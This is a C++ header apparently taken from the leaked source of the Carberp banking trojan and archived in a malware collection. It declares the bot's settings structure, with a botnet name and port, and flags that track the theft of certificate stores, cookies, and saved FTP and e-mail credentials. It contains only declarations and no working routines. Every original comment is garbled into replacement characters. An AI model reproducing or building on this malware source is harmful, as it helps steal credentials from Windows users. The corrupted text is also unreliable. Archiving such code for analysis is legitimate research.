/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ���������� ���������� �����������.
  ����� �������� ��������� � �������� ��������� ������� � ������ ������.
*/
#pragma once

namespace LocalSettings
{
  //SETTINGS::flags
  enum
  {
    FLAG_BOTNET = 0x1, //������ ����������.
  };

  //SETTINGS::processStartupFlags
  enum
  {
    PSF_CERTSTORE_GRABBED      = 0x01, //���������� ��������.
    PSF_MFP_GRAB               = 0x02, //����� �������� ������ ����-������.
    PSF_MFP_REMOVE             = 0x04, //����� ������� ������ ����-������.
    PSF_SOFTWARE_FTP_GRABBED   = 0x08, //������ �� FTP-�������� ��������.
    PSF_COOKIES_GRABBED        = 0x10, //������ ��������� ��������.
    PSF_USER_DISABLED          = 0x20, //������������ ��������.
    PSF_SOFTWARE_EMAIL_GRABBED = 0x40, //E-mail'� �� �������� ��������.
  };
  
# pragma pack(push, 1)  
  typedef struct
  {
    DWORD flags;                        //����� FLAG_*.
    WCHAR botnet[BOTNET_MAX_CHARS + 1]; //��� �������.
    DWORD processStartupFlags;          //����� PSF_*.
    WORD tcpPortS1;                     //��������� ���� ��� S1.
    BYTE reserved[64];                  //��������������� �� �������.
  }SETTINGS;
# pragma pack(pop)

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ������� �������� ��� ����������.

    OUT settings - ����� ��� ��������.
  */
  void getCurrent(SETTINGS *settings);
  
  /*
    ��������� ������� �������� � ����������� ������� ��� ������ ������� � ���������.

    OUT settings - ����� ��� ��������.

    Return       - true - �������� ���������, ������ ������������,
                   false - ��������� ������.
  */
  bool beginReadWrite(SETTINGS *settings);

  /*
    ������ ���������� ��������� beginReadWrite() � ���������� ���������.

    IN OUT settings - ��������� ��� ����������, ��� NULL ���� ���������� �� ���������. �� ������
                      ���������� ������ �� �������� ��� �������������.
    
    Return          - true - ��������� ������� ����������,
                      false - ��������� �� ���������.
  */
  bool endReadWrite(SETTINGS *settings);
};
